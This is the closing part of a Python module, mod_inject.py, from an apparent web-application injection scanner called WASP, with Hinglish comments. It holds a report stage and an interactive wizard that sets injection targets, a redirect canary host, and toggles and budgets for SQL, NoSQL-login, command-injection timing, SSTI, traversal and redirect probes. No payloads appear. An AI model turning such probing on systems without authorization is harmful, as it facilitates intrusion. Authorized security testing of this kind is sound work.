    head("Stage Q - Hypotheses & feedforward")
    hyps = build_hypotheses(ctx, conf, meta, results_by_stage, ranked)
    ok("%d hypothesis/manual item(s)" % len(hyps))

    # ---------------- Stage R: reports ----------------
    head("Stage R - Reports (findings/matrix/plan/chains/feedforward)")
    meta["probes_total"] = sum(
        (results_by_stage.get(s, {}).get("stats", {}) or {}).get("probes", 0)
        for s in results_by_stage)
    write_reports(out, scope, F, ctx, meta, results_by_stage, hyps, ranked, conf)
    info("probes sent (approx): %d | findings: %d" % (meta["probes_total"], len(F.items)))
    info("duration: %s" % human_dur_stub(time.time() - t_start))
    return out


def human_dur_stub(sec):
    m, s = divmod(int(sec), 60)
    return "%dm%02ds" % (m, s) if m else "%ds" % s


# ===========================================================================
# WIZARD (interactive config builder)
# ===========================================================================
def ask(prompt):
    try:
        return input("%s " % prompt)
    except EOFError:
        return ""


def _wizard():
    if not CORE:
        print("[-] wizard ke liye bhi wasp_core.py chahiye (isi folder me rakho).")
        sys.exit(1)
    head("Phase 12 wizard - injection targets / gates config builder")
    cfg_path = sys.argv[2] if len(sys.argv) > 2 else "config.json"
    data = {}
    if os.path.exists(cfg_path):
        try:
            data = json.load(open(cfg_path)) or {}
        except Exception:
            data = {}
    targets = list(data.get("inject_manual_targets") or [])
    while True:
        print("\n  1) manual target add     2) targets dekho/del")
        print("  3) canary domain         4) gates toggle (nosql-login/cmdi-timing/time-based)")
        print("  5) probe budgets         6) save & exit")
        ch = ask("choice").strip()
        if ch == "1":
            u = ask("URL with param (e.g. https://site/search?q=term):").strip()
            if u.startswith("http") and "?" in u:
                sp, qs = _split_url(u)
                p = ask("param name [%s]:" % (qs[0][0] if qs else "q")).strip() \
                    or (qs[0][0] if qs else "q")
                targets = [t for t in targets if not (t.get("url") == u and t.get("param") == p)]
                targets.append({"url": u, "param": p})
                ok("target added")
            else:
                err("full URL + query param chahiye")
        elif ch == "2":
            for i, t in enumerate(targets):
                print("  [%d] %s  [%s]" % (i, t.get("url"), t.get("param")))
            d = ask("delete index (khali = kuch nahi):").strip()
            if d.isdigit() and int(d) < len(targets):
                targets.pop(int(d))
        elif ch == "3":
            c = ask("canary host [example.com]:").strip()
            if c:
                data["inject_redirect_canary"] = c
                ok("canary set: %s" % c)
        elif ch == "4":
            print("  a) inject_nosql_login_probe (ab: %s)" % data.get("inject_nosql_login_probe", False))
            print("  b) inject_cmdi_timing      (ab: %s)" % data.get("inject_cmdi_timing", False))
            print("  c) inject_allow_time_based (ab: %s)" % data.get("inject_allow_time_based", True))
            g = ask("toggle which (a/b/c):").strip()
            key = {"a": "inject_nosql_login_probe", "b": "inject_cmdi_timing",
                   "c": "inject_allow_time_based"}.get(g)
            if key:
                data[key] = not bool(data.get(key, key != "inject_allow_time_based"))
                ok("%s = %s" % (key, data[key]))
        elif ch == "5":
            for key in ("inject_error_probes", "inject_boolean_probes",
                        "inject_time_probes", "inject_ssti_probes",
                        "inject_traversal_probes", "inject_redirect_probes"):
                v = ask("%s [%s]:" % (key, DEFAULTS.get(key))).strip()
                if v.isdigit():
                    data[key] = int(v)
        elif ch == "6":
            data["inject_manual_targets"] = targets
            with open(cfg_path, "w") as f:
                json.dump(data, f, indent=2)
            _rwx_result(cfg_path)
            ok("saved -> %s (targets: %d)" % (cfg_path, len(targets)))
            break


def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "wizard":
        _wizard()
        return
    print("WASP mod_inject.py (Phase 12 - Injection, v%s)" % PLAN_VERSION)
    print("  run        : python3 wasp.py run --module 12   (ya --module inject)")
    print("  wizard     : python3 mod_inject.py wizard [config.json]")
    print("  self-test  : python3 test_mod_inject.py")
    print("\n  Module wasp.py ke through chalta hai (scope/budget/rate-limit wahan se).")


if __name__ == "__main__":
    main()
